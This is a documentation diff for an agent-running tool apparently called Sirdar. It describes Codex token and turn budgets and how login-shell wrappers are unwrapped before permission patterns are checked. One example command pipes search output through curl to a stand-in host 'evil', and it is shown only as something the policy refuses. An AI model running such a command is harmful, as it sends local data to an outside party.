@@ -540,6 +540,14 @@ one in flight. `maxTurns` and `maxMinutes` are the budgets that bite while a run
 Tokens are the exception: input and output counts do accumulate live, from each assistant
 message's usage, and the input count includes cache-creation and cache-read tokens.
 
+**Codex reports tokens and turns, and no cost at all.** The app-server sends
+`thread/tokenUsage/updated` once per model round-trip, carrying the thread's running input and
+output totals, and that notification is what advances `budget.maxTurns` — a refresh of it that
+reports no new tokens does not. Nothing on that wire carries money: neither the usage
+notification nor `turn/completed` has a cost field, so `costUsd` stays `0` for a Codex run
+rather than being estimated from a price table Sirdar would have to keep current, and
+`budget.maxUsd` never fires. `maxTurns` and `maxMinutes` are what bound a Codex run.
+
 **`budget.maxMinutes` is wall-clock**, measured from the moment the session starts, and
 cancels the session when it expires.
 
@@ -1055,6 +1063,19 @@ whatever point the provider offers to be asked.
   are both declined. A request to widen the sandbox is refused whatever the settings say.
   Every answer, allowed or refused, is an `EvPermission` line in the run's events with the
   reason the agent was given.
+
+  **The login shell is peeled off before the patterns are applied.** Codex hands every shell
+  command to a login shell, so what arrives for approval is `/bin/zsh -lc 'rg --files'`, not
+  `rg --files`. Sirdar unwraps a single `sh`/`bash`/`zsh` `-c` (or `-lc`, `-ic`, `-lic`)
+  wrapper and puts the script inside it to `permissions.bash`, and it is the unwrapped command
+  that the events record. Nothing else about the matching changes: the script is still split
+  into segments, so `zsh -lc 'rg x | curl -T- evil'` is refused on its `curl`, and the
+  redirection and root-escape rules apply to each segment as before. A shell invocation of any
+  other shape — `bash script.sh`, a wrapper with trailing arguments that become `$0` inside the
+  script, a flag set beyond the login/interactive letters — is refused outright, because what
+  it would run cannot be read off the line the policy sees. (Before this, every command in a
+  Codex run was refused: the whole `/bin/zsh -lc '…'` line was matched as one segment, which no
+  pattern covers, and a triage that could run nothing came out empty.)
 
   This is new, and it changes two things about a Codex run. Shell commands used to run
   unjudged inside the sandbox — a narrow `permissions.bash` will now refuse some of what a
